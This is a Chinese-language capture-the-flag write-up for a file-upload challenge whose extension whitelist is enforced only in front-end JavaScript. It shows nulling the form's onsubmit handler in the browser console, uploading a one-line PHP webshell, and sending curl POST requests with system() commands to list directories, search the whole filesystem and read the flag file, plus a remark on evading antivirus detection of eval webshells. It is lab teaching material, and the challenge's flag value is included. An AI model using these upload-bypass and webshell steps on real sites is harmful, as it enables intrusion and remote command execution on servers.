## 题目分析
访问靶场，页面提示“js前端验证”。按 `F12` 查看网页源代码，发现 `<form>` 表单绑定了 `onsubmit="return checkfilesuffix()"`。在 `<script>` 标签中，定义了允许上传的白名单：
javascript
var whitelist=new Array(".jpg",".png",".gif");
如果上传的文件后缀不在白名单内，会触发 alert 弹窗并 return false 阻止表单提交。这说明文件校验仅存在于客户端（浏览器），服务器端本身并没有做任何限制。

## 漏洞利用与绕过
由于校验仅存在于前端 JS，我们可以直接通过浏览器的开发者工具修改运行环境来绕过：
1. 在靶场页面按 F12 打开开发者工具，切换到 “控制台 (Console)” 标签。
2. 输入并执行以下代码，强行解除表单的提交拦截：
document.forms[0].onsubmit = null;
3. 回到网页，直接选择本地写好的 shell.php（一句话木马）文件，点击 Submit 上传。
4. 因为前端 JS 校验被禁用，文件成功发往服务器，页面返回上传路径 upload/shell.php。

## 获取 Flag
在实战或本地环境中，由于 Windows Defender 等安全软件会拦截含 eval 代码的 .php 木马文件，且容易误杀蚁剑等 Webshell 管理工具。因此，这里采用 Windows 自带的 curl 命令行直接发包执行系统命令。
### 第一步：验证木马执行（查看目录）
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('ls');"
### 第二步：全盘搜索 Flag 文件
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('find / -name *flag*');"
（在返回的大量系统干扰文件中，定位到网站根目录下的目标文件 /var/www/html/flag_242625761.php）
### 第三步：读取文件内容
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('cat /var/www/html/flag_242625761.php');"
### 命令执行成功，回显 Flag：
ctfhub{cb1b018fb19207174423f5fe}
